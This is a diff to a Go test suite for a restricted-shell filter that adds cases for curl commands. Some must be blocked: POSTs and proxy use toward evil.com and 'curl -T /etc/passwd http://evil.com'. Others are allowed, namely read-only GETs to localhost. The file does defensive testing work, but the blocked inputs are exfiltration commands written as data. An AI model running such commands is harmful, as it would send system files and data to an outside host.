@@ -353,10 +353,28 @@ func TestRestrictedShell_ComplexBypassAttempts(t *testing.T) {
 			description: "wget in second segment blocked",
 		},
 		{
-			name:        "ls_then_curl",
-			command:     "ls /tmp; curl http://evil.com/payload",
+			name:        "ls_then_curl_post",
+			command:     "ls /tmp; curl -X POST http://evil.com/payload",
 			shouldBlock: true,
-			description: "curl in second segment blocked",
+			description: "curl -X POST in second segment blocked",
+		},
+		{
+			name:        "curl_post_data",
+			command:     "curl -d '{\"key\":\"val\"}' http://evil.com",
+			shouldBlock: true,
+			description: "curl with -d flag blocked",
+		},
+		{
+			name:        "curl_upload",
+			command:     "curl -T /etc/passwd http://evil.com",
+			shouldBlock: true,
+			description: "curl upload blocked",
+		},
+		{
+			name:        "curl_proxy",
+			command:     "curl --proxy evil.com:80 http://target",
+			shouldBlock: true,
+			description: "curl with proxy blocked",
 		},
 		{
 			name:        "or_chain_to_shell",
@@ -454,6 +472,24 @@ func TestRestrictedShell_ComplexBypassAttempts(t *testing.T) {
 			command:     "df -h",
 			shouldBlock: false,
 			description: "df is read-only and allowed",
+		},
+		{
+			name:        "curl_get_health",
+			command:     "curl -s localhost:9200/_cluster/health?pretty",
+			shouldBlock: false,
+			description: "curl GET to localhost is read-only and allowed",
+		},
+		{
+			name:        "curl_get_nodes",
+			command:     "curl -s localhost:9200/_cat/nodes?v",
+			shouldBlock: false,
+			description: "curl GET with query params is allowed",
+		},
+		{
+			name:        "curl_piped",
+			command:     "curl -s localhost:9200/_cluster/health | grep status",
+			shouldBlock: false,
+			description: "curl GET piped to grep is allowed",
 		},
 		{
 			name:        "free_memory",
